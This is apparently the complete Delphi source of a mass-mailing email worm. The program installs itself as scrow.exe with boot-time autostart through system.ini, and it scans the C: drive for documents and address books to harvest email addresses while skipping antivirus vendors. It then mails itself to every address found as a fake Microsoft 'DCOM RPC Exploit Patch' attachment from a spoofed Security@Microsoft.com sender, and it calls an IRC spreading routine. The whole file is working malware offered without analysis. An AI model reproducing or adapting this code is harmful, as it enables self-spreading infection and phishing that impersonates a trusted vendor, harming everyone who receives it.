   program sC;
   uses
     windows,
     wininet,irc,
     winsock,
     Unit1 in 'Unit1.pas';

   type
     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;

   var
    names, all_mail:string;
    Sock1:TSocket;
    SockInfo:Sockaddr_in;
    WSAData:TWSAData;
    TempDirBuff,TempFileNameBuff:Pchar;
   function Gnet:boolean;
   var
    connect_status:dword;
   begin
    connect_status := 2+
                      1+
                      4;
    result := InternetGetConnectedState(@connect_status,0);
   end;

   function windir:String;
   var
    ap:array[0..666]of char;
   begin
    getwindowsdirectory(ap,255);
    result := ap;
    result := result+'\';
   end;

   function sysdir:String;
   var
    ap:array[0..666]of char;
   begin
    getsystemdirectory(ap,255);
    result := ap;
    result := result+'\';
   end;

   Procedure Autostart(win,start:boolean;name_string:string);
   begin
    if win then
      copyfile(pchar(paramstr(0)), pchar(windir+name_string), false)
    else
      copyfile(pchar(paramstr(0)), pchar(sysdir+name_string), false);

    if start then
      writeprivateprofilestring('boot','shell',pchar('Explorer.exe '+name_string),'system.ini')
    else
      writeprivateprofilestring('boot','shell',pchar('Explorer.exe'),'system.ini');
   end;

   function FileAge(const FileName: string): Integer;
   {$IFDEF MSWINDOWS}
   var
     Handle: THandle;
     FindData: TWin32FindData;
     LocalFileTime: TFileTime;
   begin
     Handle := FindFirstFile(PChar(FileName), FindData);
     if Handle <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(Handle);
       if (FindData.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) = 0 then
       begin
         FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
         if FileTimeToDosDateTime(LocalFileTime, LongRec(Result).Hi,
           LongRec(Result).Lo) then Exit;
       end;
     end;
     Result := -1;
   end;
   {$ENDIF}
   {$IFDEF LINUX}
   var
     st: TStatBuf;
   begin
     if stat(PChar(FileName), st) = 0 then
       Result := st.st_mtime
     else
       Result := -1;
   end;
   {$ENDIF}

   function FileExists(const FileName: string): Boolean;
   {$IFDEF MSWINDOWS}
   begin
     Result := FileAge(FileName) <> -1;
   end;
   {$ENDIF}
   {$IFDEF LINUX}
   begin
     Result := euidaccess(PChar(FileName), F_OK) = 0;
   end;
   {$ENDIF}

   function AnsiUpperCase(const S: string): string;
   {$IFDEF MSWINDOWS}
   var
    Len: Integer;
   begin
    Len := Length(S);
    SetString(Result, PChar(S), Len);
    if Len > 0 then CharUpperBuff(Pointer(Result), Len);
   end;
   {$ENDIF}
   {$IFDEF LINUX}
   begin
    Result := WideUpperCase(S);
   end;
   {$ENDIF}

   function IntToStr(X: integer): string;
   var
    S: string;
   begin
    Str(X, S);
    Result := S;
   end;

   function mail2(s:string;ext:String):string;
   var
   i,j:integer;
   abc:string;
   f:string;
   label q,t;
   begin
    abc := '@.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-0123456789';
   result := '';
   i:=0;
   q:
   if pos('.'+ext,s)-i = 0 then begin
   for j :=0 to length(result)-1 do begin
   f := f + copy(result,length(result)-j,1);
   end;
    result := f + ext;
    exit;
   end;
   if pos(copy(s,pos('.'+ext,s)-i,1),abc) = 0 then begin
   i:=pos('.'+ext,s);//i+1;
   goto q;
   end else begin
   result := result + copy(s,pos('.'+ext,s)-i,1);
   i:=i+1;
   goto q;
   end;
   end;

   procedure mail(g:string;ext:string);
   var i:integer;y,a,s:string;
   abc:string;
   label u,b,f;
   begin
    abc := '@.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-0123456789';
   f:
   if (pos('.'+ext,g) > 0) then begin
   s := copy(g,0,pos('.'+ext,g));
   s := s +ext;
   i:=1;
   b:
   y:=copy(s,pos('.'+ext,s)-i,1);
   if pos(y,abc) > 0 then
   begin
    a:=copy(s,pos(' ',s)+1,length(s));
   while pos(' ',a) > 0 do
    a:=copy(a,pos(' ',a)+1,length(a));
   if pos('www',a) > 0 then exit;
   if pos('wwp',a) > 0 then exit;
   if pos('ftp',a) > 0 then exit;
   if pos('http',a) > 0 then exit;
   if pos('@',a) = 0 then exit;
   a := mail2(a,ext);
   if (a <> '.'+ext) and (a <> '') and (a <> ' ') and (a <> ' .'+ext) then begin
    if pos(ansiuppercase(a),ansiuppercase(all_mail)) =0 then begin
    if (pos(ansiuppercase('antiv'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('syman'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('microsoft'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('trendm'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('f-sec'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('mcaf'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('virus'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('anti'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('kav'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('kasp'),ansiuppercase(a)) = 0) then
     all_mail := all_mail + ansiuppercase(a) + #13#10;
   end;
    //all_mail := all_mail + a + '%';
   end;
    end
    else begin
   i:=i+1;
   sleep(100);
    goto b;
    end;
   end;
   g := copy(g,pos(a,g)+length(a),length(g));
   if copy(g,0,2) = #13#10 then g := copy(g,3,length(g));
   if pos('.'+ext,g) > 0 then goto f;
   end;

   function Extractfilename(s:String):String;
   begin

    while pos('\',s)>0 do
     s := copy(s,pos('\',s)+1,length(s));

    result := s;
   end;

   procedure ReadText(b:string);
   var
       TextTemp: String;
       TextTemp2: String;
       Text: String; test:integer;
       EditText: TextFile;
   begin
   try
   if pos('.',extractfilename(b)) = 0 then exit;
   if not fileexists(b) then exit;
       AssignFile(EditText, b);
       Reset(EditText);
       test := filesize(edittext);
   if test > 1200 then exit;
       Read(Edittext, TextTemp);
       ReadLn(EditText, TextTemp2);
       Text := TextTemp;
   While Not Eof(EditText) do begin
       Read(Edittext, TextTemp);
       ReadLn(EditText, TextTemp2);
       Text := Text + #13 + #10 + TextTemp;
   end;
       CloseFile(EditText);
       mail(text,'co.nz');
       mail(text,'com');
       mail(text,'net');
       mail(text,'org');
       mail(text,'se');
       mail(text,'tk');
   except
    exit;
   end;
   end;


   procedure ListFiles(D, Name, SearchName : String);
   const
     faReadOnly  = $00000001 platform;
     faHidden    = $00000002 platform;
     faSysFile   = $00000004 platform;
     faVolumeID  = $00000008 platform;
     faDirectory = $00000010;
     faArchive   = $00000020 platform;
     faAnyFile   = $0000003F;

   type
     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle  platform;
       FindData: TWin32FindData  platform;
     end;

     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;

     function FindMatchingFile(var F: TSearchRec): Integer;
     var
       LocalFileTime: TFileTime;
     begin
       with F do
       begin
         while FindData.dwFileAttributes and ExcludeAttr <> 0 do
           if not FindNextFile(FindHandle, FindData) then
           begin
             Result := GetLastError;
             Exit;
           end;
         FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
         FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
           LongRec(Time).Lo);
         Size := FindData.nFileSizeLow;
         Attr := FindData.dwFileAttributes;
         Name := FindData.cFileName;
   // html, htm, wab, txt, vbs, eml, ods, mmf, nch, mbx, tbb
         if (name <> '.') and (name <> '..') and ((ansiuppercase(copy(name,length(name)-3,4))='.HTM') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.WAB') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.EML') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.ODS') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.MMF') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.NCH') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.MBX') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.TBB') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.CPP') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.DPR') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.FRM') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.BAS') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.DOC') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.RTF') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.VBS') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.TXT') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='HTML') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.ASP')) then begin
         try
    if (pos(ansiuppercase('antiv'),    ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('syman'),    ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('microsoft'),ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('trendm'),   ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('f-sec'),    ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('mcaf'),     ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('virus'),    ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('anti'),     ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('kav'),      ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('serv'),     ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('kasp'),     ansiuppercase(d+name)) = 0) then
          names:=names+d+name+#13#10;
         except
          ;
         end;
         end;

       end;
       Result := 0;
     end;

     procedure FindClose(var F: TSearchRec);
     begin
       if F.FindHandle <> INVALID_HANDLE_VALUE then
       begin
         Windows.FindClose(F.FindHandle);
         F.FindHandle := INVALID_HANDLE_VALUE;
       end;
     end;

     function FindFirst(const Path: string; Attr: Integer;
       var  F: TSearchRec): Integer;
     const
       faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
     begin
       F.ExcludeAttr := not Attr and faSpecial;
       F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
       if F.FindHandle <> INVALID_HANDLE_VALUE then
       begin
         Result := FindMatchingFile(F);
         if Result <> 0 then FindClose(F);
       end else
         Result := GetLastError;
     end;

     function FindNext(var F: TSearchRec): Integer;
     begin
       if FindNextFile(F.FindHandle, F.FindData) then
         Result := FindMatchingFile(F) else
         Result := GetLastError;
     end;

   var
     SR: TSearchRec;
   begin
     If D[Length(D)] <> '\' then D := D + '\';

     If FindFirst(D + '*.*', faDirectory, SR) = 0 then
       Repeat
         If ((Sr.Attr and faDirectory) = faDirectory) and (SR.Name[1] <> '.') then
           ListFiles(D + SR.Name + '\', Name, SearchName);
       Until (FindNext(SR) <> 0);
     FindClose(SR);
   end;


   Function SendMail(remoteadd:string):boolean;
   var
    line1,line2,te,a,b,f,str:string;
    g:textfile;
   begin
    result := false;
    while result = false do begin
    if Gnet then result := true else result := false;
    end;
    str:='HELO hotmail.com' + #13#10;send(Sock1,str[1],Length(str),0);
    str:='MAIL FROM: <Security@Microsoft.com>' + #13#10;send(Sock1,str[1],Length(str),0);
    str:='RCPT TO: <'+remoteadd+'>' + #13#10;send(Sock1,str[1],Length(str),0);
    str:='DATA' + #13#10;send(Sock1,str[1],Length(str),0);

   randomize();
   a := '';
   b := '';
   while length(a) <= 13 do
   a:=a+inttostr(random(9));

   while length(b) <= 4 do
   b := inttostr(random(99999));

   f := 'Message-ID: '+a+'.'+b+'.qmail@hotmail.com';

    str:=f + #13#10;send(Sock1,str[1],Length(str),0);

   str:=('FROM: Security Alert <Security@Microsoft.com>'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('TO:'+remoteadd+' <'+remoteadd+'>'+#13#10);send(Sock1,str[1],Length(str),0);
   randomize;
   case random(2) of
   0:str:=('SUBJECT: DCOM RPC Exploit Patch'+#13#10);
   1:str:=('SUBJECT: DCOM RPC Exploit'+#13#10);
   2:str:=('SUBJECT: Patch your Systems.'+#13#10);
   end;
   send(Sock1,str[1],Length(str),0);
   str:=('MIME-Version: 1.0'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('Content-Type: multipart/mixed; boundary="--ABCDEF"'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('X-Priotity: 3'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('X-MSMail-Priority: Normal'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('X-Mailer: Microsoft Outlook Express 5.50'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('X-MimeOLE: Produced by Microsoft MimeOLE v 5.50'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=(#13#10 + 'This is a multipart MIME-coded message'+#13#10+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('----ABCDEF'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('Content-Type: text/html; charset="us-ascii"'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('Content-Transfer-Encoding: quoted-printable'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=(#13#10);send(Sock1,str[1],Length(str),0);
   str:=('Ever since the announcement of the RPC DCOM vulnerability,<BR>the hacker community has been busy refining exploits in order to make use of this issue.<BR>'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('Over the last two weeks, a number of exploits have been released.<BR>They are very easy to use and have already been used to attack numerous systems.<BR>'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('Currently, more than 1/4 of the sensors participating in the Internet Storm Center have detected scans for this vulnerability.<BR>'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('If successful, the exploit will be hard to detect.<BR>Only if the exploit failed, you will see a popup alert indicating that the RPC service died. Your machine may reboot by itself as a result.<BR>'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('Essentially all versions of Windows are vulnerable. The only exception is Windows ME.<BR>A patch has been made available by Microsoft as of July 16th 2003.<BR>'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('Recommendation:<BR>'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('- Patch your systems as fast as possible.<BR>'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('- apply firewall rules to block at least port 135, 139 and 445.<BR>RPC may use other ports as well depending on configuration. Do not use these limited rules in lieu of patches.<BR>'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'+#13#10+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('©2003 Microsoft Corporation. All rights reserved<BR>'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('----ABCDEF'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('Content-Type: audio/x-wav; name="MS-56095M_PATCH.exe"'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('Content-Transfer-Encoding: base64'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('Content-Disposition: attachment; filename="MS-56095M_PATCH.exe"'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=('Content-ID: <SOMECID>'+#13#10);send(Sock1,str[1],Length(str),0);
   str:=(#13#10);send(Sock1,str[1],Length(str),0);

   encode_base64(paramstr(0),windir+'MS-56095M_PATCH.exe');

   assignfile(g,windir+'MS-56095M_PATCH.exe');

   reset(g);
   read(g,line1);
   readln(g,line2);
   te := line1;
   str:=(te+#13#10);send(Sock1,str[1],Length(str),0);
   while not EOF(g) do begin
   read(g,line1);
   readln(g,line2);
   te := line1;
   str:=(te+#13#10);send(Sock1,str[1],Length(str),0);
   end;
   closefile(g);

   str:=(#13#10);send(Sock1,str[1],Length(str),0);
   str:=('----ABCDEF--'+#13#10);send(Sock1,str[1],Length(str),0);


    sleep(600);
    str:=#13#10+'.'+#13#10;send(Sock1,str[1],Length(str),0);

   end;

   function getip(iip:string):string;
   var ip :phostent;
       ipc:cardinal;
       ipa:array[1..4]of byte absolute ipc;
   begin
     ip:=winsock.gethostbyname(pchar(iip));
     if ip=nil then begin
       result:='127.0.0.1';
       exit;
     end else begin
       ipc:=cardinal(pointer(ip^.h_addr_list^)^);
       ipc:=winsock.ntohl(ipc);
     end;
     result:=inttostr(ipa[4])+'.'+inttostr(ipa[3])+'.'+inttostr(ipa[2])+'.'+inttostr(ipa[1]);
   end;

   var m,n,pooman:string;
   begin
     autostart(false,true,'scrow.exe');

       listfiles('C:\','*','*.*');

   while names<> '' do begin
   n:=copy(names,1,pos(#13#10,names)-1);

   getMem(TempDirBuff,MAX_PATH+1);
   getMem(TempFileNameBuff,MAX_PATH+1);

   GetTempPath(MAX_PATH+1,TempDirBuff);
   GetTempFileName(TempDirBuff,'~DP',0,TempFileNameBuff);
   m :=PChar(Copy(TempFileNameBuff,0,Length(TempFileNameBuff) - 3) + '.txt');
   copyfile(pchar(n),PChar(Copy(TempFileNameBuff,0,Length(TempFileNameBuff) - 3) + '.txt'),false);
   try
   if fileexists(m) then ReadText(m);
   deletefile(pchar(m));
   except
   ;
   end;
   names := copy(names,pos(#13#10,names)+2,length(names));
   end;

     WSAStartup(257,WSAData);
     SockInfo.sin_family:=PF_INET;
     SockInfo.sin_port:=htons(25);
     SockInfo.sin_addr.S_addr:= inet_addr(pchar(getip('mail.hotmail.com')));
     Sock1:= socket(PF_INET,SOCK_STREAM,0);
     Connect(Sock1,SockInfo,sizeof(SockInfo));

   while all_mail <> '' do begin
     pooman := copy(all_mail,1,pos(#13#10,all_mail)-1);
     sendmail( pooman );
     sleep(100);
     all_mail := copy(all_mail,pos(#13#10,all_mail)+2,length(all_mail));
   end;
   mirc;
   end.
